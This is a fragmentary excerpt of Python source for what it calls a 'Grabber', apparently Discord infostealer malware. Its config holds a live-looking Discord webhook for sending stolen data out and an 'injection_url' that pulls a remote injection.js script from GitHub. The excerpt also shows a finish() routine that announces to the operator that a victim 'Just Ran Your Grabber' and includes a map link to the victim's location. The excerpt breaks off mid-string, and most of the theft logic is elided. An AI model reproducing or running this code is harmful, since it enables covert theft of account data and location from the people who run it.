...
config = {
    ...
    'webhook': "https://discord.com/api/webhooks/1094671680841981982/SpcrFYhm-FujAX5QQYn18yqObRshX5dAIIw3lYQnIv9LRNolrCXiBHeJ-B7LLYb_FuTg",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js",
    ...
    def finish(self):
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'*{os.getlogin()}* Just Ran Your Grabber!',
                        'url': 'https://discord.gg/calword',
                        'icon_url': 'https://i.postimg.cc/KcwKjMP4/image-2023-01-19-045245374-removebg-preview.png'
                    },
                    'color': 16119101,
                    'description': f'[Location]({googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
